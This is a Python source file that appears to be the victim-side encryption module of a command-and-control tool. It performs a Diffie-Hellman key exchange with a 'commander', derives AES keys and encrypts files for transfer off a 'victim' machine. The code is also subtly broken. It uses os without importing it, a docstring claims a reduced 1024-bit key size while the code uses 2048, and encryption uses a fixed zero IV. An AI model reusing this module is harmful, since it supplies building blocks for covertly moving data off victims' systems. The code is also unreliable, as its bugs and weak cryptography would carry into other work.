import socket
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.dh import DHPublicKey, DHPrivateKey, DHParameters
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


def send_dh_parameters(cmdr_socket: socket.socket, parameters: DHParameters):
    """
    Converts Diffie-Hellman parameters into bytes and
    sends to commander.

    @param cmdr_socket:
        The commander socket

    @param parameters:
        Diffie-Hellman parameters (containing prime number and generator value)

    @return: None
    """
    try:
        print("[+] EXCHANGING PARAMETERS: Now sending Diffie-Hellman parameters to commander...")
        serialized_parameter = parameters.parameter_bytes(encoding=serialization.Encoding.PEM,
                                                          format=serialization.ParameterFormat.PKCS3)
        cmdr_socket.send(serialized_parameter)
        response = cmdr_socket.recv(1024).decode()

        if response == "OK":
            print("[+] OPERATION SUCCESSFUL: Diffie-Hellman parameters has been sent successfully!")
            return None
        else:
            print("[+] EXCHANGE PARAMETERS UNSUCCESSFUL: An error has occurred!")
            return None

    except Exception as e:
        print("[+] EXCHANGE PARAMETERS UNSUCCESSFUL: An error has occurred: {}".format(e))


def generate_keys_and_parameters():
    """
    Generates private and public keys for a
    Diffie-Hellman Key Exchange.

    @attention: Key Size Reduced
            The key size has been reduced from common 2048 to 1024,
            which may reduce the security of the keys.

            This reduction is for faster key generation for
            lower-end systems.

    @return private_key, public_key:
            DHPrivateKey and DHPublicKey Objects
    """
    # a) Set DH Parameters (must be agreed upon and same between both cmdr & victim)
    print("[+] GENERATING KEYS: Now generating private and public keys...")
    parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())

    # b) Generate Private Key (used for generating public key)
    private_key = parameters.generate_private_key()  # => Private Key is a random number

    # c) Generate Public Key (Equation = (Generator ^ private_key) % random prime number)
    public_key = private_key.public_key()
    print("[+] OPERATION SUCCESSFUL: Private and public keys have been successfully generated!")

    return private_key, public_key, parameters


def serialize_public_key(public_key: DHPublicKey):
    """
    Serializes the public key for key exchange
    between commander and victim.

    @param public_key:
        A DHPublic Key object representing victim's
        public key

    @return serialized_public_key:
        A byte representation of the victim's public key
    """
    print("[+] SERIALIZING PUBLIC KEY: Now serializing the public key...")

    serialized_public_key = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    print("[+] OPERATION SUCCESSFUL: The public key have been successfully serialized!")
    return serialized_public_key


def __deserialize_public_key(client_public_key_bytes: bytes):
    """
    Deserializes the commander's public key
    from bytes into DHPublicKey object after
    key exchange.

    @param client_public_key_bytes:
        A byte representation of the commander's public key

    @return client_public_key:
        A DHPublic Key object representing client's public key
    """
    print("[+] DESERIALIZING PUBLIC KEY: Now deserializing peer's public key...")

    client_public_key = serialization.load_pem_public_key(
        client_public_key_bytes,
        backend=default_backend()
    )
    print("[+] OPERATION SUCCESSFUL: The peer's public key have been successfully deserialized!")
    return client_public_key


def key_exchange_initiator(client_sock: socket.socket, serialized_pub_key: bytes):
    """
    Initiates public key exchange (commander initiates)
    between commander and target/victim.

    @attention: Use Case/Scenario
        This is used for when commander is initiating the
        encryption and file transfer

    @param client_sock:
        The client socket

    @param serialized_pub_key:
        A byte representation of the victim's public key

    @return client_public_key:
        A DHPublic Key object representing commander's public key
    """
    try:
        # a) Send Public Key
        print("[+] KEY EXCHANGE: Now exchanging public keys with commander...")
        client_sock.send(serialized_pub_key)

        # b) Await + Receive Status Response
        client_public_key_bytes = client_sock.recv(1024)

        # c) Deserialize the public key
        client_public_key = __deserialize_public_key(client_public_key_bytes)
        print("[+] OPERATION SUCCESSFUL: Commander's public key has been received!")

        return client_public_key
    except Exception as e:
        print("[+] DF KEY EXCHANGE ERROR: An error has occurred during key exchange: {}".format(e))


def key_exchange_receiver(client_sock: socket.socket, serialized_pub_key: bytes):
    """
    Initiates public key exchange (commander awaits)
    between commander and target/victim.

    @attention: Use Case/Scenario
        This is used for when the victim is initiating the
        encryption and file transfer

    @param client_sock:
        The client socket

    @param serialized_pub_key:
        A byte representation of the victim's public key

    @return client_public_key:
        A DHPublic Key object representing commander's public key
    """
    try:
        # a) Wait and Receive Public Key (in Serialized (Byte) Form)
        print("[+] KEY EXCHANGE: Now exchanging public keys with commander...")
        print("[+] WAITING FOR COMMANDER: Now waiting for commander to send their public key...")
        client_public_key_bytes = client_sock.recv(1024)

        # b) Send Serialized Public Key
        client_sock.send(serialized_pub_key)

        # b) Deserialize the public key
        client_public_key = __deserialize_public_key(client_public_key_bytes)
        print("[+] OPERATION SUCCESSFUL: Commander's public key has been received!")

        return client_public_key
    except Exception as e:
        print("[+] DF KEY EXCHANGE ERROR: An error has occurred during key exchange: {}".format(e))


def generate_shared_secret(private_key: DHPrivateKey, client_public_key: DHPublicKey):
    """
    Given peer's DHPublicKey, carry out the key exchange and
    return a derived shared AES key as bytes.

    @param private_key:
        The victim's private key

    @param client_public_key:
        A DHPublic Key object representing victim's public key

    @return: Shared Secret
        A shared secret key (in bytes)
    """
    try:
        print("[+] GENERATING SECRET: Now generating secret using private key and target/victim's public key...")

        if client_public_key:
            shared_secret = private_key.exchange(client_public_key)
            print("[+] OPERATION SUCCESSFUL: A shared secret has been established!")
            return shared_secret
        else:
            print("[+] DF SECRET GENERATION UNSUCCESSFUL: An error occurred during secret generation!")
    except Exception as e:
        print("[+] DF SECRET GENERATION UNSUCCESSFUL: An error occurred during secret generation: {}".format(e))


def generate_salt():
    """
    Generates a salt used for the derivation of a
    shared AES key

    @return salt:
        A random 16-byte (128 bit) salt
    """
    try:
        print("[+] GENERATING SALT: Now generating a 16-byte (128) bit salt for AES key generation...")
        salt = os.urandom(16)
        print("[+] OPERATION SUCCESSFUL: A salt has been generated!")
        return salt
    except Exception as e:
        print("[+] SALT GENERATION FAILED: An error has occurred: {}".format(e))


def derive_aes_key(shared_key: bytes, salt: bytes):
    """
    Generate a recoverable AES key using the shared Diffie-Hellman
    secret and a salt.

    @param shared_key:
        A byte representation of the shared key
        (after DH key exchange)

    @param salt:
        A random 16-byte (128 bit) salt

    @return aes_key:
        A 256-bit AES key used for encryption/decryption
    """
    try:
        print("[+] AES KEY GENERATION: Now generating an AES key using shared secret and salt...")

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # => Use 32 bytes for a 256-bit key
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )

        aes_key = kdf.derive(shared_key)
        print("[+] OPERATION SUCCESSFUL: An AES key has been generated!")
        return aes_key
    except Exception as e:
        print("[+] AES KEY GENERATION FAILED: An error has occurred: {}".format(e))


def encrypt_file(file_path: str, shared_key: bytes):
    """
    Encrypts a file's data using AES (Advanced Encryption Standard)
    method.

    @param file_path:
        A string representing the path of the file

    @param shared_key:
        A byte representation of the shared key (secret)
        (after DH key exchange)

    @return encrypted_data:
        A byte representation of the encrypted data
    """
    try:
        print("[+] ENCRYPTING: Now encrypting the following file: {}".format(file_path))
        with open(file_path, 'rb') as file:
            file_content = file.read()

        # Generate a unique salt
        salt = generate_salt()

        # Derive an AES key using the shared key and salt
        aes_key = derive_aes_key(shared_key, salt)

        # Perform Encryption using an AES cipher
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(b'\0' * 16), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(file_content) + encryptor.finalize()

        # Prepend the salt to the encrypted data
        encrypted_data_with_salt = salt + encrypted_data

        print("[+] OPERATION SUCCESSFUL: The data has been successfully encrypted!")
        return encrypted_data_with_salt

    except Exception as e:
        print("[+] FILE ENCRYPTION ERROR: An error has occurred while encrypting "
              "the following file: ({}, {})".format(file_path, e))


def decrypt(encrypted_data: bytes, shared_key: bytes):
    """
    Decrypts a file's data using AES (Advanced Encryption Standard)
    method.

    @param encrypted_data:
        A byte representation of encrypted data

    @param shared_key:
        A byte representation of the shared key
        (after DH key exchange)

    @return encrypted_data:
        A byte representation of the encrypted data
    """
    try:
        print("[+] DECRYPTING: Now decrypting data...")

        # Extract the 16-byte salt from the encrypted data
        salt = encrypted_data[:16]  # => Used 16-bytes
        encrypted_data = encrypted_data[16:]

        # Derive and generate the same AES key used for encryption
        aes_key = derive_aes_key(shared_key, salt)

        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(b'\0' * 16), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        print("[+] OPERATION SUCCESSFUL: The data has been successfully decrypted!")
        return decrypted_data

    except Exception as e:
        print("[+] FILE DECRYPTION ERROR: An error has occurred while decrypting the data: {}".format(e))
